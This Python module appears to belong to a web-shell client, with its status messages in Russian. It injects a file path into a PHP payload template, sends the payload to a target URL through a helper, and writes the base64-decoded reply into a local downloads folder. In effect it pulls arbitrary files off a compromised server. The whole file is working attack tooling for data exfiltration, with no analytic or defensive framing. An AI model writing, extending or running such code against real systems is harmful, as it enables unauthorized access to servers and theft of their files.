import modules.send as send
import modules.exist as exist
from base64 import b64decode
import os

def file(url,com,pwd,uagent):
    with open('modules\\dl\\dl.php') as f:data = f.read()
    if "/" in com: #Проверка на абсолютный путь удяляемого
        if exist.file(url,com,uagent) == "1":
            data = data.replace("$cat = $_LOCAL;", f"$cat = \'{com}\';")
            file = send.send(url,data,uagent)
            if file !="X":
                open("downloads\\"+os.path.basename(com), "wb").write(b64decode(file))
                print("Файл загружен в папку downloads")
                return "downloads\\"+os.path.basename(com)
            else:
                print("Файл нечитаем")
        else:
            print("Файла не существует")
    else:
        if exist.file(url,pwd+'/'+com,uagent) == "1":
            data = data.replace("$cat = $_LOCAL;", f"$cat = \'{pwd+'/'+com}\';")
            file = send.send(url,data,uagent)
            if file !="X":
                open("downloads\\"+com, "wb").write(b64decode(file))
                print("Файл загружен в папку downloads")
                return "downloads\\"+com
            else:
                print("Файл нечитаем")
        else:
            print("Файла не существует")